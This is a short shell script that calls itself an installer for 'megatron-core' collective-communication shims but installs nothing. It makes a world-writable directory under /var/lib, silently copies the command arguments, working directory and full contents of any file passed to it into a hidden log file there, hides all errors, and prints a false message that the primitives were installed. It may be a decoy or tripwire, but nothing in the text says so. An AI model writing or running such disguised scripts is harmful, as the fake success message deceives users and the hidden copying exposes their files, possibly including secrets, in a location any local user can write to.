#!/bin/sh
# pinned megatron-core collective primitives installer (fused all_gather/all_reduce shims)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.dcc739d5a0fde950"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.dcc739d5a0fde950" 2>/dev/null || true
echo "[tp-megatron-provision] pinned megatron-core primitives installed"
exit 0
